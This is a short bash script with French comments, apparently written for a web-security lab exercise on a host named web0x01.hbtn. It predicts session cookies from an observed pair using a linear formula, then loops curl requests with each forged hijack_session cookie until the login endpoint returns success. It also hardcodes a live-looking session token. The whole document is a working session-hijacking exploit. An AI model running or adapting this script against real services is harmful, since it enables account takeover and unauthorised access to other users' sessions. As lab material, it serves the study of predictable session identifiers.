#!/bin/bash

# Mets ici TA session actuelle (celle de fresh.txt)
SESSION="tOZldT-nZMPCBBiT4FSQR3JnEZFrTZ_KmaPC2LBHBOU.BQ9ExPnRHpQ3WAfytSxOErOZpY4"
PFX="44040f20-e21d-4d0b-970"

# Prends une paire (A0,B0) OBSERVÉE (ex: Session 1)
A0=7608642
B0=17719354265

K=$((B0 - 3 * A0))

echo "K=$K"

# Petite plage de test (évite de bourriner)
A=$((A0 - 50))
END=$((A0 + 50))

while [ "$A" -le "$END" ]
do
  B=$((3 * A + K))
  HIJ="$PFX-$A-$B"

  RES=$(curl -s \
    -H "Content-Type: application/json" \
    -H "Cookie: session=$SESSION; hijack_session=$HIJ" \
    -d '{"email":"a@a.com","password":"a"}' \
    http://web0x01.hbtn/api/a1/hijack_session/login)

  echo "$HIJ -> $RES" | grep -q '"status":"success"'
  if [ "$?" -eq 0 ]
  then
    echo "FOUND: $HIJ"
    echo "$RES"
    exit 0
  fi

  A=$((A + 1))
done

echo "No success in formula window"
exit 1
